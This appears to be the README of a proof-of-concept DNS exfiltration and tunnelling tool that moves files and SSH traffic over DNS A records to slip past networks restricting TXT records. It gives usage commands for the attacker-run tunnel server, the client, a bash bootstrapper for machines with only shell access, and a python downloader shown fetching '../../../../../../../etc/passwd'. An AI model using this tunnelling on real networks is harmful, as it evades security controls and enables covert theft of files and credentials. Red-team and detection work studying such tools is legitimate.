<pre>
# DNS-Exfil
PoC DNS exfiltration tool with bash bootstrap and file transfer functions using A records
exclusively. this will bypass a lot of systems that have restricted TXT records.

the tool has been written to conform pretty closely to ansi C and should build
under any OS that supports a posix-y gethostbyname() function


the dns tunnel server is intended to run on a server which can be the
the SOA for a domain or subdomain.

on the server:
# python dnstun.py --domain [SOA record name]

on the client:
$ ./client -s [SOA record name]


which will let you SSH to the SSH port on the server host (by default, but configurable):
$ ssh localhost -p 2093



downloading a file name "test" from the server using the bash bootstrapper, this is intended to be used
in places where you might only have keyboard or shell access with few tools, this script should even work
with busybox assuming it supports all of the dependencies (awk, ping) but you could easily modify this
to get the job done with our simple bootstrap downloader. One note about the "simple" method is that the file
name should only contain a-z,A-Z,0-9,-_ in its filename, a "." extenstion will fuck everything up in this mode

$./bootstrap_file_transfer.sh [SOA record name] [filename]


if you dont mind typing a bit more, and have python on the system, you can use the filedl.py script
to more quickly download a file as it makes use of multiple A recorcs unlike the "simple method". You
can also use any filename using this method since the filename is encoded during transit

$python filedl.py  -d [SOA record name] -f "../../../../../../../etc/passwd"


files are stored on the server in the "files" subdirectory from the server script..

now go.. tunnel..

</pre>
